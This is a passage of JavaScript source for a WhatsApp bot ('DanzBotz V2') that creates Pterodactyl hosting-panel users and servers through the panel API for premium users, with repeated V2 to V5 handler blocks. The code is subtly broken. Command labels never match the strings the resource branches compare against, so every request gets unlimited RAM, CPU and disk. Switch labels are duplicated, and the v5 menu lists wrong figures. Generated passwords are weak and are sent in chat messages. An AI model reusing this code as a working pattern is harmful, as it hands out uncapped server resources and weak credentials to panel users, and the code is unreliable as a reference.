                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunliv2"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "cp1gbV2": case "cp2gbV2": case "cp3gbV2": case "cp4gbV2": case "cp5gbV2": case "cp6gbV2": case "cp7gbV2": case "cp8gb": case "cp9gbV2": case "cp10gbV2": case "cp11gbV2": case "cp12gbV2": case "cp13gbV2": case "cp14gbV2": case "cp15gbV2": case "cpunliV2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV2}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cpanelbuttonv3': {
if (!isPremium && !isCreator) return Reply(mess.prem)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbv3"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbv3"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbv3"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbv3"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbv3"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbv3"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbv3"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbv3"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbv3"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbv3"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbv3"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbv3"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbv3"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbv3"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbv3"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunliv3"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "cp1gbV3": case "cp2gbV3": case "cp3gbV3": case "cp4gbV3": case "cp5gbV3": case "cp6gbV3": case "cp7gbV3": case "cp8gbV3": case "cp9gbV3": case "cp10gbV3": case "cp11gbV3": case "cp12gbV3": case "cp13gbV3": case "cp14gbV3": case "cp15gbV3": case "cpunliV3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV3 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV3 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV3}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cpanelbuttonv4': {
if (!isPremium && !isCreator) return Reply(mess.prem)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbv4"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbv4"
                                },
                                                                {
                                    title: "RAM 3 CPU 80%",
                                    description: "Buat Panel 3GB",
                                    id: ".cp3gbv4"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbv4"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbv4"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbv4"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbv4"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbv4"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbv4"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbv4"
                                   },
                                                                {
                                    title: "RAM 11 CPU 360%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbv4"
                                   },
                                                               {
                                    title: "RAM 12 CPU 390%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbv4"
                                   },
                                                                 {
                                    title: "RAM 13 CPU 420%",
                                    description: "Buat Panel 13GB",
                                    id: ".cp13gbv4"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbv4"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbv4"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunliv4"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "cp1gbV4": case "cp2gbV4": case "cp3gbV4": case "cp4gbV4": case "cp5gbV4": case "cp6gbV4": case "cp7gbV4": case "cp8gb": case "cp9gbV4": case "cp10gbV4": case "cp11gbV4": case "cp12gbV4": case "cp13gbV4": case "cp14gbV4": case "cp15gbV4": case "cpunliV4": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV4 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV4 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV4}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

case 'cpanelbuttonv5': {
if (!isPremium && !isCreator) return Reply(mess.prem)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let menu = `╭──────✦───────────╮
     *乂 𝐂𝐩𝐚𝐧𝐞𝐥 𝐁𝐮𝐭𝐭𝐨𝐧 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "RAM 1 CPU 40%",
                                    description: "Buat Panel 1GB",
                                    id: ".cp1gbv5"
                                },
                                                                {
                                    title: "RAM 2 CPU 60%",
                                    description: "Buat Panel 2GB",
                                    id: ".cp2gbv5"
                                },
                                                                {
                                    title: "RAM 5 CPU 80%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbv5"
                                },
                                                                {
                                    title: "RAM 4 CPU 100%",
                                    description: "Buat Panel 4GB",
                                    id: ".cp4gbv5"
                                },
                                                                {
                                    title: "RAM 5 CPU 120%",
                                    description: "Buat Panel 5GB",
                                    id: ".cp5gbv5"
                                },
                                                                {
                                    title: "RAM 6 CPU 140%",
                                    description: "Buat Panel 6GB",
                                    id: ".cp6gbv5"
                                },
                                                                {
                                    title: "RAM 7 CPU 160%",
                                    description: "Buat Panel 7GB",
                                    id: ".cp7gbv5"
                                },
                                                                {
                                    title: "RAM 8 CPU 180%",
                                    description: "Buat Panel 8GB",
                                    id: ".cp8gbv5"
                                },
                                                                {
                                    title: "RAM 9 CPU 200%",
                                    description: "Buat Panel 9GB",
                                    id: ".cp9gbv5"
                                },
                                                                {
                                    title: "RAM 10 CPU 220%",
                                    description: "Buat Panel 10GB",
                                    id: ".cp10gbv5"
                                   },
                                                                {
                                    title: "RAM 11 CPU 560%",
                                    description: "Buat Panel 11GB",
                                    id: ".cp11gbv5"
                                   },
                                                               {
                                    title: "RAM 12 CPU 590%",
                                    description: "Buat Panel 12GB",
                                    id: ".cp12gbv5"
                                   },
                                                                 {
                                    title: "RAM 15 CPU 420%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbv5"
                                  },
                                                                {
                                    title: "RAM 14 CPU 450%",
                                    description: "Buat Panel 14GB",
                                    id: ".cp14gbv5"
                                  },
                                                                {
                                    title: "RAM 15 CPU 480%",
                                    description: "Buat Panel 15GB",
                                    id: ".cp15gbv5"
                                  },
                                                                {
                                    title: "RAM UNLIMITED CPU UNLIMITED",
                                    description: "Buat Panel Unli",
                                    id: ".cpunliv5"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {      
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "cp1gbV5": case "cp2gbV5": case "cp3gbV5": case "cp4gbV5": case "cp5gbV5": case "cp6gbV5": case "cp7gbV5": case "cp8gb": case "cp9gbV5": case "cp10gbV5": case "cp11gbV5": case "cp12gbV5": case "cp13gbV5": case "cp14gbV5": case "cp15gbV5": case "cpunliV5": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isPremium) return Reply(mess.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@Danz.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV5 + "/api/application/nests/5/eggs/" + egg, {
